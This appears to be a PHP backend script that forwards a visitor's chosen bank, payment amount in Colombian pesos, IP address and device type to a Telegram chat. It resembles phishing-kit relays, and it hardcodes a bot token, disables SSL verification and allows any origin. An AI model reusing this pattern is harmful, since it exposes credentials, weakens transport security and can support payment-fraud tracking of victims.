<?php
header('Content-Type: application/json');
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

// Configuración de Telegram
// Configuración de Telegram
$telegram_token = '7497890468:AAGGItTPfO8JXfESTE8QV_NU22qc-tCsU7A';
$chat_id = '-1002745153757';




function enviarNotificacionTelegram($token, $chat_id, $mensaje) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    
    $data = [
        'chat_id' => $chat_id,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $http_code == 200;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    
    if ($data) {
        $monto = $data['monto'] ?? 'N/A';
        $banco = $data['banco'] ?? 'N/A';
        $bancoNombre = $data['bancoNombre'] ?? 'N/A';
        
        $userIp = $_SERVER['REMOTE_ADDR'] ?? 'IP no disponible';
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'User-Agent no disponible';
        date_default_timezone_set('America/Bogota');
        
        // Detectar dispositivo
        $dispositivo = '🖥️ Desktop';
        if (preg_match('/mobile|android|iphone|ipad/i', $userAgent)) {
            $dispositivo = '📱 Móvil';
        }
        
        $mensaje = "🚨 <b>¡PERSONA DISPUESTA A PAGAR!</b>\n\n";
        $mensaje .= "💰 <b>Monto:</b> $" . number_format($monto, 0, ',', '.') . " COP\n";
        $mensaje .= "🏦 <b>Banco Seleccionado:</b> $bancoNombre (ID: $banco)\n";
        $mensaje .= "$dispositivo\n";
        $mensaje .= "📍 <b>IP:</b> $userIp\n";
        $mensaje .= "🕒 <b>Fecha:</b> " . date('Y-m-d H:i:s') . "\n\n";
        $mensaje .= "⏳ <i>Procesando pago...</i>";
        
        $enviado = enviarNotificacionTelegram($telegram_token, $chat_id, $mensaje);
        
        echo json_encode([
            'success' => $enviado,
            'message' => $enviado ? 'Notificación de intención enviada' : 'Error al enviar notificación'
        ]);
    } else {
        echo json_encode([
            'success' => false,
            'message' => 'Datos inválidos'
        ]);
    }
} else {
    echo json_encode([
        'success' => false,
        'message' => 'Método no permitido'
    ]);
}
?>